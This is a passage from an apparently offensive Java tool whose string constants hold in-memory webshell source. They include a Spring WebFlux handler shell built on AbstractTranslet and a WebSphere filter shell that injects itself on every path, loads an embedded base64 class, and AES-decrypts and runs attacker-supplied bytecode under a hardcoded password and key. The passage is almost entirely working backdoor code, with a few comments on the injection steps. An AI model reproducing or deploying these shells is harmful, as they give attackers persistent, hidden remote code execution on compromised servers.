            "        }\n" +
            "\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public void destroy() {\n" +
            "    }\n" +
            "}\n";

    public static final String SpringWebfluxHandlerMemShellAbstractTranslet = "" +
            "import com.sun.org.apache.xalan.internal.xsltc.DOM;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.TransletException;\n" +
            "import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n" +
            "import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\n" +
            "import com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n" +
            "import org.springframework.http.HttpStatus;\n" +
            "import org.springframework.http.ResponseEntity;\n" +
            "import org.springframework.web.bind.annotation.PostMapping;\n" +
            "import org.springframework.web.reactive.result.method.RequestMappingInfo;\n" +
            "import org.springframework.web.server.ServerWebExchange;\n" +
            "import reactor.core.publisher.Mono;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.net.URL;\n" +
            "import java.net.URLClassLoader;\n" +
            "import java.util.HashMap;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "\n" +
            "public class SpringWebfluxHandlerMemShellAbstractTranslet extends AbstractTranslet {\n" +
            "    public static Map<String, Object> store = new HashMap<String , Object>();\n" +
            "    public static String pass = \"pAS3\", md5, xc = \"3c6e0b8a9c15224a\";\n" +
            "\n" +
            "    public static String doInject(Object obj, String path) {\n" +
            "        String msg;\n" +
            "        try {\n" +
            "            md5 = md5(pass + xc);\n" +
            "            Method registerHandlerMethod = obj.getClass().getDeclaredMethod(\"registerHandlerMethod\", Object.class, Method.class, RequestMappingInfo.class);\n" +
            "            registerHandlerMethod.setAccessible(true);\n" +
            "            Method executeCommand = SpringWebfluxHandlerMemShell.class.getDeclaredMethod(\"xx\", ServerWebExchange.class);\n" +
            "            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).build();\n" +
            "            registerHandlerMethod.invoke(obj, new SpringWebfluxHandlerMemShell(), executeCommand, requestMappingInfo);\n" +
            "            msg = \"ok\";\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "            msg = \"error\";\n" +
            "        }\n" +
            "        return msg;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    private static Class defineClass(byte[] classbytes) throws Exception {\n" +
            "        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());\n" +
            "        Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "        method.setAccessible(true);\n" +
            "        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception e) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "        try {\n" +
            "            java.security.MessageDigest m;\n" +
            "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        String value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (String)Encoder.getClass().getMethod(\"encodeToString\", byte[].class).invoke(Encoder, bs);\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String)Encoder.getClass().getMethod(\"encode\", byte[].class).invoke(Encoder, bs);\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[])null).invoke(base64, (Object[])null);\n" +
            "            value = (byte[])((byte[])decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[])((byte[])decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    @PostMapping(\"/xx\")\n" +
            "    public synchronized ResponseEntity xx(\n" +
            "            ServerWebExchange pdata) {\n" +
            "        try {\n" +
            "            Object bufferStream = pdata.getFormData().flatMap(c -> {\n" +
            "                StringBuilder result = new StringBuilder();\n" +
            "                try {\n" +
            "                    String id = c.getFirst(pass);\n" +
            "                    byte[] data = x(base64Decode(id), false);\n" +
            "                    if (store.get(\"payload\") == null) {\n" +
            "                        store.put(\"payload\", defineClass(data));\n" +
            "                    } else {\n" +
            "                        store.put(\"parameters\", data);\n" +
            "                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
            "                        Object f = ((Class) store.get(\"payload\")).newInstance();\n" +
            "                        f.equals(arrOut);\n" +
            "                        f.equals(data);\n" +
            "                        result.append(md5.substring(0, 16));\n" +
            "                        f.toString();\n" +
            "                        result.append(base64Encode(x(arrOut.toByteArray(), true)));\n" +
            "                        result.append(md5.substring(16));\n" +
            "                    }\n" +
            "                } catch (Exception ex) {\n" +
            "                    result.append(ex.getMessage());\n" +
            "                }\n" +
            "                return Mono.just(result.toString());\n" +
            "            });\n" +
            "            return new ResponseEntity(bufferStream, HttpStatus.OK);\n" +
            "        } catch (Exception ex) {\n" +
            "            return new ResponseEntity(ex.getMessage(), HttpStatus.OK);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n" +
            "        \n" +
            "    }\n" +
            "}";

    public static final String WebSphereFilterMemShell =
                            "import sun.misc.BASE64Decoder;\n" +
                            "\n" +
                            "import javax.servlet.DispatcherType;\n" +
                            "import javax.servlet.Filter;\n" +
                            "import java.io.IOException;\n" +
                            "import java.lang.reflect.InvocationTargetException;\n" +
                            "import java.lang.reflect.Method;\n" +
                            "import java.util.EnumSet;\n" +
                            "import java.util.List;\n" +
                            "\n" +
                            "public class WebSphereFilterMemShell {\n" +
                            "\n" +
                            "    static{\n" +
                            "        Inject();\n" +
                            "    }\n" +
                            "\n" +
                            "    public WebSphereFilterMemShell(){\n" +
                            "        Inject();\n" +
                            "    }\n" +
                            "\n" +
                            "    public static synchronized Class getDynamicFilterTemplateClass() {\n" +
                            "        ClassLoader cl = Thread.currentThread().getContextClassLoader();\n" +
                            "        Class clazz = null;\n" +
                            "        try{\n" +
                            "            clazz = cl.loadClass(\"memshell.WebSphereFilterShell\");\n" +
                            "        }catch(ClassNotFoundException e){\n" +
                            "            BASE64Decoder base64Decoder = new BASE64Decoder();\n" +
                            "            String codeClass = \"yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAfTG1lbXNoZWxsL1dlYlNwaGVyZUZpbHRlclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA8QcBBgcAxQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHANwBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsHAQcBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI5AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsHAQgHAQkBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAGVdlYlNwaGVyZUZpbHRlclNoZWxsLmphdmEMAGYAZwwAXABdDABeAF8BABAzYzZlMGI4YTljMTUyMjRhDABgAGEBAARwQVMzDABiAGEBABAvZmF2aWNvbmRlbW8uaWNvDABjAGEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBCgELDAEMAQ0MAGQAgQwAZABhAQAFVVRGLTgMAGUAYQwAZgBtDAEOAQ8BAANBRVMHAQYMARABEQEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMARIBEwwAZgEUDACSARUMARYBFwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHARgMARABGQwBGgEbDAEcAR0BABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBHgETDABmAR8MAQwBIAwBIQENAQAQamF2YS51dGlsLkJhc2U2NAwBIgEjAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBJAElAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBJgwBJwEoDAEpASoBAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBKwEsAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBYLVJlcXVlc3RlZC1XaXRoDAEtAIEBAA5YTUxIVFRQUmVxdWVzdAwBLgEvDAEwATEMATIAgQwAjwCQDAB0AHUBABBtZW1zaGVsbC5wYXlsb2FkBwEIDAEzATQBAB1tZW1zaGVsbC9XZWJTcGhlcmVGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9s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\";\n" +
                            "            byte[] bytes = new byte[0];\n" +
                            "            try {\n" +
                            "                bytes = base64Decoder.decodeBuffer(codeClass);\n" +
                            "            } catch (IOException ex) {\n" +
                            "                ex.printStackTrace();\n" +
                            "            }\n" +
                            "\n" +
                            "            Method method = null;\n" +
                            "            Class clz = cl.getClass();\n" +
                            "            while(method == null && clz != Object.class ){\n" +
                            "                try{\n" +
                            "                    method = clz.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                            "                }catch(NoSuchMethodException ex){\n" +
                            "                    clz = clz.getSuperclass();\n" +
                            "                }\n" +
                            "            }\n" +
                            "            method.setAccessible(true);\n" +
                            "            try {\n" +
                            "                clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);\n" +
                            "            } catch (IllegalAccessException ex) {\n" +
                            "                ex.printStackTrace();\n" +
                            "            } catch (InvocationTargetException ex) {\n" +
                            "                ex.printStackTrace();\n" +
                            "            }\n" +
                            "        }\n" +
                            "\n" +
                            "        return clazz;\n" +
                            "    }\n" +
                            "\n" +
                            "    public static synchronized void Inject(){\n" +
                            "        try{\n" +
                            "            String filterName = \"memshell.WebSphereFilterMemShell\";\n" +
                            "            String urlPattern = \"/*\";\n" +
                            "\n" +
                            "            Class clazz = Thread.currentThread().getClass();\n" +
                            "            java.lang.reflect.Field field = clazz.getDeclaredField(\"wsThreadLocals\");\n" +
                            "            field.setAccessible(true);\n" +
                            "            Object obj = field.get(Thread.currentThread());\n" +
                            "\n" +
                            "            Object[] obj_arr = (Object[]) obj;\n" +
                            "            for(int j = 0; j < obj_arr.length; j++){\n" +
                            "                Object o = obj_arr[j];\n" +
                            "                if(o == null) continue;\n" +
                            "\n" +
                            "                if(o.getClass().getName().endsWith(\"WebContainerRequestState\")){\n" +
                            "                    Object request = o.getClass().getMethod(\"getCurrentThreadsIExtendedRequest\", new Class[0]).invoke(o, new Object[0]);\n" +
                            "                    Object servletContext = request.getClass().getMethod(\"getServletContext\", new Class[0]).invoke(request, new Object[0]);\n" +
                            "\n" +
                            "                    field = servletContext.getClass().getDeclaredField(\"context\");\n" +
                            "                    field.setAccessible(true);\n" +
                            "                    Object context = field.get(servletContext);\n" +
                            "\n" +
                            "                    field = context.getClass().getSuperclass().getDeclaredField(\"config\");\n" +
                            "                    field.setAccessible(true);\n" +
                            "                    Object webAppConfiguration = field.get(context);\n" +
                            "\n" +
                            "                    Method method = null;\n" +
                            "                    Method[] methods = webAppConfiguration.getClass().getMethods();\n" +
                            "                    for(int i = 0; i < methods.length; i++){\n" +
                            "                        if(methods[i].getName().equals(\"getFilterMappings\")){\n" +
                            "                            method = methods[i];\n" +
                            "                            break;\n" +
                            "                        }\n" +
                            "                    }\n" +
                            "                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);\n" +
                            "\n" +
                            "                    boolean flag = false;\n" +
                            "                    for(int i = 0; i < filerMappings.size(); i++){\n" +
                            "                        Object filterConfig = filerMappings.get(i).getClass().getMethod(\"getFilterConfig\", new Class[0]).invoke(filerMappings.get(i), new Object[0]);\n" +
                            "                        String name = (String) filterConfig.getClass().getMethod(\"getFilterName\", new Class[0]).invoke(filterConfig, new Object[0]);\n" +
                            "                        if(name.equals(filterName)){\n" +
                            "                            flag = true;\n" +
                            "                            break;\n" +
                            "                        }\n" +
                            "                    }\n" +
                            "\n" +
                            "                    //如果已存在同名的 Filter，就不在添加，防止重复添加\n" +
                            "                    if(!flag){\n" +
                            "                        clazz = getDynamicFilterTemplateClass();\n" +
                            "\n" +
                            "                        Object filterConfig = context.getClass().getMethod(\"createFilterConfig\", new Class[]{String.class}).invoke(context, new Object[]{filterName});\n" +
                            "                        Object filter = clazz.newInstance();\n" +
                            "                        filterConfig.getClass().getMethod(\"setFilter\", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});\n" +
                            "\n" +
                            "                        method = null;\n" +
                            "                        methods = webAppConfiguration.getClass().getMethods();\n" +
                            "                        for(int i = 0; i < methods.length; i++){\n" +
                            "                            if(methods[i].getName().equals(\"addFilterInfo\")){\n" +
                            "                                method = methods[i];\n" +
                            "                                break;\n" +
                            "                            }\n" +
                            "                        }\n" +
                            "                        method.invoke(webAppConfiguration, new Object[]{filterConfig});\n" +
                            "\n" +
                            "                        field = filterConfig.getClass().getSuperclass().getDeclaredField(\"context\");\n" +
                            "                        field.setAccessible(true);\n" +
                            "                        Object original = field.get(filterConfig);\n" +
                            "\n" +
                            "                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常\n" +
                            "                        field.set(filterConfig, null);\n" +
                            "\n" +
                            "                        method = filterConfig.getClass().getDeclaredMethod(\"addMappingForUrlPatterns\", new Class[]{EnumSet.class, boolean.class, String[].class});\n" +
                            "                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});\n" +
                            "\n" +
                            "                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值\n" +
                            "                        field.set(filterConfig, original);\n" +
                            "\n" +
                            "                        method = null;\n" +
                            "                        methods = webAppConfiguration.getClass().getMethods();\n" +
                            "                        for(int i = 0; i < methods.length; i++){\n" +
                            "                            if(methods[i].getName().equals(\"getUriFilterMappings\")){\n" +
                            "                                method = methods[i];\n" +
                            "                                break;\n" +
                            "                            }\n" +
                            "                        }\n" +
                            "\n" +
                            "                        //这里的目的是为了将我们添加的动态 Filter 放到第一位\n" +
                            "                        List uriFilterMappingInfos = (List)method.invoke(webAppConfiguration, new Object[0]);\n" +
                            "                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));\n" +
                            "                    }\n" +
                            "\n" +
                            "                    break;\n" +
                            "                }\n" +
                            "            }\n" +
                            "        }catch(Exception e){\n" +
                            "            e.printStackTrace();\n" +
                            "        }\n" +
                            "    }\n" +
                            "}\n" +
                            "\n";

    public static String ExecTemplateJDK7 = "\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
